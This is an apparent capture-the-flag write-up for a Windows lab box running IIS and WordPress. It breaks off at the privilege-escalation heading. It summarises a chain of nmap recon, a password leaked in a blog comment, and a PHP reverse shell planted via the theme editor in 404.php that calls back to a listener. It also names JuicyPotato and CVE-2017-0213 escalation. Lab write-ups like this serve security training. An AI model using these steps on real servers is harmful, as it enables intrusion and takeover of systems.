// Attack Chain

Recon (Nmap) → Port 80 (IIS / WordPress /retro/) · Port 3389 (RDP) → Wade's blog comment discloses password → WP Admin login (wade : ████████) → Appearance › Theme Editor › 90s-retro/404.php → PHP reverse shell → Trigger: /retro/wp-content/themes/90s-retro/404.php?os=windows → Shell as nt authority\iusr → whoami /priv → SeImpersonatePrivilege Enabled → Transfer JuicyPotato.exe + msfvenom payload.exe → JuicyPotato CLSID {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} → Shell as nt authority\system → type C:\Users\Administrator\Desktop\root.txt.txt → ████████████████ [Alternative Path] → xfreerdp as wade → user.txt on Desktop → Download CVE-2017-0213_x64.exe via Chrome → Execute → Elevated cmd → root.txt.txt → ████████████████

// Phase 1 — Reconnaissance

1.1 Nmap Scan

nmap -sV -sC 10.49.187.4 -Pn

Open ports: 80/tcp Microsoft IIS 10.0 · 3389/tcp Microsoft Terminal Services (RDP)

1.2 WordPress Comment — Credential Disclosure

Browsing http://10.49.187.4/retro/, user wade posted a comment revealing his password is his avatar name.

  • Username: wade
  • Password: ████████

// Phase 2 — Initial Foothold (WordPress Theme Editor RCE)

Logged into /retro/wp-login.php with wade:████████. Navigated to Appearance › Theme Editor, selected 90s Retro theme, edited 404.php.

2.1 Injected PHP Reverse Shell (404.php)

<?php
$ip   = '192.168.132.94';
$port = 4444;
$os   = isset($_GET['os']) ? $_GET['os'] : '';
if ($os === 'windows') {
    $cmd = "powershell -NoP -NonI -W Hidden -Command ...";
    system($cmd);
}
?>

penelope nc -p 4444

// Phase 3 — Privilege Escalation (JuicyPotato)
